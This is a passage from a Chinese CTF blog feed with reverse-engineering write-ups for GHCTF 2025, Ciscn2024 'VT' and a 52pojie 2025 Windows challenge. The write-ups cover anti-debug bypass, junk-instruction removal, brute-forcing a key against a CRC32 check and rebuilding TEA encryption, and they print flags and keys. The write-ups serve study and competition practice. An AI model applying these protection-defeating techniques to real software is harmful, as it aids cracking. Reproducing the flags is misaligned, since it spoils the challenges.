class="type">uint8_t</span> v26 = Key &gt;&gt; <span class="number">8</span> * (<span class="number">3</span> - i % <span class="number">4</span>);</span><br><span class="line">        v26 ^= (<span class="type">uint8_t</span>)(i &amp; <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">        Input[i] = (Input[i] - (<span class="type">uint8_t</span>)i) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        Input[i] = ((Input[i] &gt;&gt; <span class="number">3</span>) | (Input[i] &lt;&lt; <span class="number">5</span>)) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        Input[i] = Input[i] ^ v26;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> Key = <span class="number">0x8C90F77B</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Decrypt</span>(EncFlag, Key);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> v66 = <span class="number">0x811C9DC5</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v71 = Key &gt;&gt; (i * <span class="number">8</span>);</span><br><span class="line">        <span class="type">uint32_t</span> v67&#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (v71 % <span class="number">2</span>)</span><br><span class="line">            v67 = v66 ^ v71;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v67 = <span class="number">16777619</span> * v66;</span><br><span class="line">        v67 = (v67 &gt;&gt; <span class="number">25</span>) | (v67) &lt;&lt; <span class="number">7</span>;</span><br><span class="line">        v66 = v67 - v71;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        EncFlag[j] ^= <span class="number">8</span> * (v66 &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, EncFlag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-8"><a href="#Flag值-8" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;NSSCTF&#123;NSSCTF&#123;NSSCTF&#123;&#125;&#125;&#125;&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GHCTF-2025-Reverse-WP&quot;&gt;&lt;a href=&quot;#GHCTF-2025-Reverse-WP&quot; class=&quot;headerlink&quot; title=&quot;GHCTF 2025 Reverse WP&quot;&gt;&lt;/a&gt;GHCTF 2025 Reverse WP&lt;/</summary>
      
    
    
    
    
    <category term="CTF出题" scheme="https://tkazer.github.io/tags/CTF%E5%87%BA%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Ciscn2024-逆向0解题-VT</title>
    <link href="https://tkazer.github.io/2025/02/20/Ciscn-reverse-vt/"/>
    <id>https://tkazer.github.io/2025/02/20/Ciscn-reverse-vt/</id>
    <published>2025-02-20T15:36:15.000Z</published>
    <updated>2025-02-21T03:18:32.661Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ciscn2024-逆向0解题-VT"><a href="#Ciscn2024-逆向0解题-VT" class="headerlink" title="Ciscn2024-逆向0解题-VT"></a>Ciscn2024-逆向0解题-VT</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这题不想吐槽什么，利用开源的混淆项目将代码混淆就是一道题。由于逆向功底不够且花指令样式随机多变，只能手动去除花指令，这部分就花了一个小时左右。当时比赛时看到一坨混淆直接放弃了，现在重新做一遍发现其实花点时间其实也是可以解出的。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="程序分析-开源混淆项目"><a href="#程序分析-开源混淆项目" class="headerlink" title="程序分析&amp;开源混淆项目"></a>程序分析&amp;开源混淆项目</h3><p>首先是例常Die，发现和叠Buff一样的一系列特征。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/1.png" alt="alt text"></p><p>后续在Github上找到了这个混淆的项目（obfus.h），只是用一系列特征来伪造。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/2.png" alt="alt text"></p><p>大概阅览了一下这个混淆项目，就是利用一堆花指令和逻辑混淆处理代码，然后封装了一些常用函数。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/3.png" alt="alt text"></p><p>这个项目最新版的GetProcAddress是自己重新封装实现的，而通过dbg断点发现题目程序的GetProcAddress是可以断下来的，所以应该是某个历史版本而非最新，至少是在这个版本之前。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/4.png" alt="alt text"></p><h3 id="去除花指令"><a href="#去除花指令" class="headerlink" title="去除花指令"></a>去除花指令</h3><p>这个程序花指令含以下几种（可能没截全），大多都是常规花指令，可以直接按U，再跳过指定字节数，按C重构代码。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/5.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/6.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/7.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/8.png" alt="alt text"></p><p>然后以下是一个特殊情况的花指令，图1是花指令，图2是去花后的，需要跳过箭头处jmp的第一个0xEB字节，然后再重构代码。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/9.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/10.png" alt="alt text"></p><p>然后接下来就是重复的操作，这部分可以利用idc脚本进行一键去除，由于我做的时候为了保证去除所有花指令，就都手动操作，花了一个小时左右。</p><h3 id="去花后程序API"><a href="#去花后程序API" class="headerlink" title="去花后程序API"></a>去花后程序API</h3><p>去花重构函数过程中，可以发现有很多这样类似的函数，其实就是之前在开源混淆项目的代码中看到的那些自封装函数，就是封装起来调用系统API的一个代理函数。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/11.png" alt="alt text"></p><p>大概有这么多，和开源项目里面差不多一致，不过并没有所有api都被调用到。（红叉处是后续分析功能自命名的）</p><p><img src="/2025/02/20/Ciscn-reverse-vt/12.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/13.png" alt="alt text"></p><h3 id="Main函数分析"><a href="#Main函数分析" class="headerlink" title="Main函数分析"></a>Main函数分析</h3><p>通过start函数进入main函数，发现有反调试代码（如IsDebuggerPresent），且在以下代码段发现有通过调用GetCommandLineA获取程序运行的命令行。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/14.png" alt="alt text"></p><p>调试尝试运行后发现程序会使用到命令行运行程序附带的前两个参数。下图这部分代码就是在main函数中将第二个命令行参数通过atoi转成ProcessId进行后续操作，所以第二个参数就应该是某个进程的ID。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/15.png" alt="alt text"></p><p>在下面发现有创建线程的代码，可以看到是创建mark2函数线程（自命名的）。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/35.png" alt="alt text"></p><p>尝试带参调试，看看能不能看mark2里面做了什么。第一个参数随便填，第二个参数随便填一个进程ID（必须要正在运行的进程，如果不是真实PID则Main函数不会阻塞，而是会跳到最后调用Exit函数）。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/16.png" alt="alt text"></p><p>然后断点在Main函数开头处，使用ScyllaHide插件进行一键去反调试。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/17.png" alt="alt text"></p><p>调试运行发现没法执行到创建线程的这个代码段，看汇编段发现是这边判断ecx等于0，所以跳转走了，没有执行。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/18.png" alt="alt text"></p><p>由于不知道这边ecx需要什么条件，直接下条件断点在cmp处，将ecx设置为1，强制执行下面的创建线程代码，便可以进入mark2函数进行下一步分析。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/19.png" alt="alt text"></p><h3 id="Mark2函数分析"><a href="#Mark2函数分析" class="headerlink" title="Mark2函数分析"></a>Mark2函数分析</h3><p>发现有类似被加密的数据（以下称encFlag），部分变量名和函数已经被我重命名了。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/20.png" alt="alt text"></p><p>param1_bytes_2指针进入两层跳转过去发现，数据指向的是我们参数1字符串unhex后的字节数据，所以就可以猜测给param1_bytes_2赋值的函数就是类似unhex函数。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/21.png" alt="alt text"></p><p>然后下面encFlag赋值后进行了重赋值，利用之前的encFlag值，调用一个函数生成了一系列key值，然后用key值异或上param1_bytes_2，这边是i%2，所以就一直循环异或这两个字节，也就是我们输入的参数1进行unhex后的两个字节。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/22.png" alt="alt text"></p><p>由于encFlag之前的值是固定的，所以生成的一系列Key也是固定的，可以直接利用条件断点在给Key赋值的地方将他输出。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/23.png" alt="alt text"></p><p>得到以下Key值列表。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/24.png" alt="alt text"></p><p>在encFlag重赋值下面，调用了一个计算call传入encFlag，计算返回一个4字节数值。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/25.png" alt="alt text"></p><p>且在下面部分可以看到对v22做了一个判断，判断是否为0xF703DF16，若不是，则会执行到这个return直接返回，不会继续执行下面部分代码。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/26.png" alt="alt text"></p><p>在下面未执行代码中看到了类似对encFlag进行解密的函数Call，并且在下面看到了判断解密后数据结尾是否是为’}’，如果是就break。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/27.png" alt="alt text"></p><p>且在最底下代码看到一个printf函数的调用，输出了解密后的字符串。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/28.png" alt="alt text"></p><h3 id="程序流程总结"><a href="#程序流程总结" class="headerlink" title="程序流程总结"></a>程序流程总结</h3><ol><li><p>首先要带两个参数运行程序，第一个参数是4长度字符串，第二个参数是一个正在运行的某个进程ID。</p></li><li><p>满足某个条件创建线程执行mark2函数进行函数主解密流程。</p></li><li><p>将第一个参数进行unhex，转成2字节数据，与固定异或列表进行一次异或计算，再调用一个计算call得到一个4字节数据，并且必须是0xF703DF16。</p></li><li><p>将通过参数1处理后的加密数据进行解密得到flag，然后printf输出。</p></li></ol><p>所以最主要是就是分析calc函数，用代码模拟calc函数进行爆破，得到密钥，也就是参数一那两个字节，接下来就分析calc函数。</p><h3 id="calc函数分析"><a href="#calc函数分析" class="headerlink" title="calc函数分析"></a>calc函数分析</h3><p>从上文可以知道calc函数第一个参数传入一个48长度字节数组，第二个参数是48，那么第二个参数应该就是输入数据的长度。</p><p>通过动调走一遍流程，确定关键计算代码，忽略其他的逻辑混淆。</p><p>最外层是通过len进行一次数据遍历，内层是进行8次的循环。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/29.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/30.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/31.png" alt="alt text"></p><p>可以用c++重写出原始的calc函数代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">calc</span><span class="params">(<span class="type">uint8_t</span>* data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> ret_value = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> count = <span class="number">0</span>; count &lt; len; count++)</span><br><span class="line">&#123;</span><br><span class="line">ret_value ^= data[count];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ret_value &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ret_value = (ret_value &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ret_value &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ~ret_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="爆破密钥（参数一）"><a href="#爆破密钥（参数一）" class="headerlink" title="爆破密钥（参数一）"></a>爆破密钥（参数一）</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">calc</span><span class="params">(<span class="type">uint8_t</span>* data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> ret_value = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> count = <span class="number">0</span>; count &lt; len; count++)</span><br><span class="line">&#123;</span><br><span class="line">ret_value ^= data[count];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ret_value &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ret_value = (ret_value &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ret_value &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ~ret_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">short</span> Param1 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 爆破2字节</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffff</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">Param1 = i;</span><br><span class="line">        <span class="comment">// ida条件断点得到的key值列表</span></span><br><span class="line"><span class="type">uint8_t</span> KeyList[]&#123;</span><br><span class="line"><span class="number">82</span>,<span class="number">225</span>,<span class="number">68</span>,<span class="number">226</span>,<span class="number">57</span>,<span class="number">225</span>,<span class="number">94</span>,<span class="number">155</span>,<span class="number">81</span>,<span class="number">220</span>,</span><br><span class="line"><span class="number">25</span>,<span class="number">152</span>,<span class="number">80</span>,<span class="number">146</span>,<span class="number">57</span>,<span class="number">193</span>,<span class="number">80</span>,<span class="number">158</span>,<span class="number">82</span>,<span class="number">130</span>,</span><br><span class="line"><span class="number">39</span>,<span class="number">130</span>,<span class="number">38</span>,<span class="number">231</span>,<span class="number">83</span>,<span class="number">128</span>,<span class="number">36</span>,<span class="number">128</span>,<span class="number">66</span>,<span class="number">220</span>,</span><br><span class="line"><span class="number">57</span>,<span class="number">158</span>,<span class="number">2</span>,<span class="number">148</span>,<span class="number">39</span>,<span class="number">129</span>,<span class="number">69</span>,<span class="number">131</span>,<span class="number">81</span>,<span class="number">147</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">128</span>,<span class="number">68</span>,<span class="number">129</span>,<span class="number">68</span>,<span class="number">129</span>,<span class="number">68</span>,<span class="number">129</span> &#125;;</span><br><span class="line"><span class="type">uint8_t</span> Enc[<span class="number">48</span>]&#123;&#125;;</span><br><span class="line"><span class="type">uint8_t</span>* pParam1 = (<span class="type">uint8_t</span>*)(<span class="type">uint64_t</span>)(&amp;Param1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calc之前的异或计算</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">48</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">Enc[j] = pParam1[j % <span class="number">2</span>] ^ KeyList[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> calc_value = <span class="built_in">calc</span>(Enc, <span class="number">48</span>);</span><br><span class="line"><span class="keyword">if</span> (calc_value == <span class="number">0xF703DF16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Cracked:%02X%02X\n&quot;</span>, pParam1[<span class="number">0</span>], pParam1[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出”Cracked:79BC”，得到密钥为<strong>79BC</strong>。</p><h2 id="获取Flag"><a href="#获取Flag" class="headerlink" title="获取Flag"></a>获取Flag</h2><p>输入密钥和一个正在运行的进程ID，再次进行调试。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/32.png" alt="alt text"></p><p>发现可以正常走到decrypt_flag函数调用处。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/33.png" alt="alt text"></p><p>单步执行完decrypt_flag函数，跳转到flag指针处，即可看到解密后的flag。</p><p><strong>flag{MjExNTY3MzE3NTQzMjI&#x3D;}</strong></p><p><img src="/2025/02/20/Ciscn-reverse-vt/34.png" alt="alt text"></p><h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>这次全流程做下来感觉其实面对复杂的混淆和花指令得有耐心去分析，耐心的动调观察数据变化以及注释关键点，这样才能更好理顺思路和理解代码流程。</p><p>这次花指令全都是手动去除，因为怕写脚本处理的花指令不完整，也就是担心去除的不完整导致程序执行错乱。现在发现其实是可以参考开源的那个混淆项目，看他用到了哪些花指令，然后结合实际汇编进行分析，应该是可以将所有花指令的情况都列出来的，然后进行一键脚本去除。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ciscn2024-逆向0解题-VT&quot;&gt;&lt;a href=&quot;#Ciscn2024-逆向0解题-VT&quot; class=&quot;headerlink&quot; title=&quot;Ciscn2024-逆向0解题-VT&quot;&gt;&lt;/a&gt;Ciscn2024-逆向0解题-VT&lt;/h1&gt;&lt;h2 id=&quot;前</summary>
      
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/categories/CTF%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>吾爱2025-Windows逆向高级题-5</title>
    <link href="https://tkazer.github.io/2025/02/18/Wuai2025Windows5/"/>
    <id>https://tkazer.github.io/2025/02/18/Wuai2025Windows5/</id>
    <published>2025-02-18T09:32:48.000Z</published>
    <updated>2025-02-21T03:18:30.467Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱2025-Windows逆向高级题-5"><a href="#吾爱2025-Windows逆向高级题-5" class="headerlink" title="吾爱2025-Windows逆向高级题-5"></a>吾爱2025-Windows逆向高级题-5</h1><p>考点：异步消息执行，变种tea展开、变种MD5、时间戳、Flag分段检查</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>这一段是获取两个编辑框的内容，即uid和flag，然后flag要符合异或的那一系列条件，实际格式是flag{…}。</p><p><img src="/2025/02/18/Wuai2025Windows5/1.png" alt="alt text"></p><p>跟到这边发现有一系列函数，main_program里面的执行验证按钮后主流程，execute是main_program里面通过不同消息来执行不同命令的函数。（都是自命名的函数，仅代表个人想法）</p><p><img src="/2025/02/18/Wuai2025Windows5/2.png" alt="alt text"></p><h2 id="execute函数"><a href="#execute函数" class="headerlink" title="execute函数"></a>execute函数</h2><p>其他消息：将flag括号内数据进行unhex（如1122字符串直接转成0x11,0x22数据）</p><p>0x35消息：获取当前半小时整点时间戳数据。</p><p><img src="/2025/02/18/Wuai2025Windows5/3.png" alt="alt text"></p><p>0x55消息：通过利用变种MD5+Salt将解密完数据的前十六字节计算得到4字节数值。</p><p><img src="/2025/02/18/Wuai2025Windows5/4.png" alt="alt text"></p><p>0x25消息：unhex后数据进行解密（Decrypt函数）。</p><p><img src="/2025/02/18/Wuai2025Windows5/5.png" alt="alt text"></p><h2 id="main-program函数"><a href="#main-program函数" class="headerlink" title="main_program函数"></a>main_program函数</h2><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p>获取flag括号内数据通过消息分发执行execute的unhex消息，然后再执行execute的Decrypt函数，解密unhex后的数据，将解密完的数据长度赋值给v12。</p><p><img src="/2025/02/18/Wuai2025Windows5/6.png" alt="alt text"></p><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>将解密完数据的前16字节进行custom_MD5，得到4字节数据，然后判断解密后数据第17个字节开始四个字节是否和计算得到的4字节数据相等。</p><p>如果相等就再次判断v12，即解密后数据长度，判断是否等于20。</p><p>再调用execute的时间戳获取消息，得到8字节时间戳数据。</p><p>最后再检查解密后数据前8字节是否等于时间戳数据，以及第九个字节往后8字节是否等于编辑框输入的uid。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>输入的flag得是被和Decrypt相对于的加密函数进行加密后的数据，加密前格式：{半时整点时间戳（8字节），uid（8字节），Custom_MD5（前面十六字节）（4字节），0x04填充（四个字节）}</p><p>最后一部分填充会在下面Decrypt函数里面说明来由。</p><p><img src="/2025/02/18/Wuai2025Windows5/7.png" alt="alt text"></p><h2 id="Decrypt函数（sub-7FF7FAC92C40）"><a href="#Decrypt函数（sub-7FF7FAC92C40）" class="headerlink" title="Decrypt函数（sub_7FF7FAC92C40）"></a>Decrypt函数（sub_7FF7FAC92C40）</h2><p>要求unhex后数据长度要是8的倍数，且利用一系列计算得到v12这个数据，参与内部解密的Key生成，最后还要求解密完的数据符合一系列条件验证。</p><p><img src="/2025/02/18/Wuai2025Windows5/8.png" alt="alt text"></p><h3 id="解密后数据条件验证"><a href="#解密后数据条件验证" class="headerlink" title="解密后数据条件验证"></a>解密后数据条件验证</h3><p>从这部分逻辑代码可以分析，他是将最后v8指向最后一个数据，然后v9赋值最后一个数据，然后v8循环递减，直到当前v8指向v8开始往前的第v9个指针结束，然后最后解密后数据长度&#x3D;当前长度-v9。</p><p>已知解密后前面已经占用了20字节（时间戳+uid+md5），在main_program也已知解密后数据长度要等于20，所以可以知道这边v9必须等于4，所以v8等于4，最后这边一共占用4个字节，即{4,4,4,4}，这样经过这边的验证最后的size才会等于20。</p><p><img src="/2025/02/18/Wuai2025Windows5/9.png" alt="alt text"></p><h3 id="dec函数"><a href="#dec函数" class="headerlink" title="dec函数"></a>dec函数</h3><p>将unhex后数据按8字节分块进行tea的解密，tea加密的Key由上一层传入的v12通过RC4得到，且每次解密Key都会变化（固定变化），直接动调就可以拿到几次解密用到的Key值。</p><p><img src="/2025/02/18/Wuai2025Windows5/10.png" alt="alt text"></p><p>下面一系列解密就是tea的解密，不过是展开，可以数出一共是12轮，且Delta直接可以通过两次sum的值相减得到（由于tea解密这边应该是加上sum，ida伪代码展示是减，但是实际计算后数值一样），B979379E就是tea解密用到的Delta。</p><p><img src="/2025/02/18/Wuai2025Windows5/11.png" alt="alt text"></p><p>所以就可以通过动调得到的几次Key和Delta写出tea的加密代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> key1[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0xD7851B65</span>,</span><br><span class="line">    <span class="number">0x473457C1</span>,</span><br><span class="line">    <span class="number">0x1231F787</span>,</span><br><span class="line">    <span class="number">0x9ACD6D9A</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint32_t</span> key2[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0xB728E994</span>,</span><br><span class="line">    <span class="number">0x1746382E</span>,</span><br><span class="line">    <span class="number">0xC52D865C</span>,</span><br><span class="line">    <span class="number">0x10778A6E</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint32_t</span> key3[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x7459F437</span>,</span><br><span class="line">    <span class="number">0x90D1E5D</span>,</span><br><span class="line">    <span class="number">0x779375B2</span>,</span><br><span class="line">    <span class="number">0xEFCB8541</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_encrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xB979379E</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="主解题流程"><a href="#主解题流程" class="headerlink" title="主解题流程"></a>主解题流程</h2><p>通过用c++实现这部分代码，获取时间戳数据（8字节）。</p><p><img src="/2025/02/18/Wuai2025Windows5/12.png" alt="alt text"></p><p>然后将uid转为8字节字节数据拼接到时间戳字节后面。</p><p>MD5值暂时填充4个0x00，将MD5值和4个0x04字节拼接上。</p><p>将完整数据进行tea_encrypt，再用flag{}包裹填入编辑框进行验证。</p><p>在MD5生成代码处，断点在箭头处，即可得到MD5四字节数据。</p><p><img src="/2025/02/18/Wuai2025Windows5/13.png" alt="alt text"></p><p>最终再重复上面步骤即可得到flag。</p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 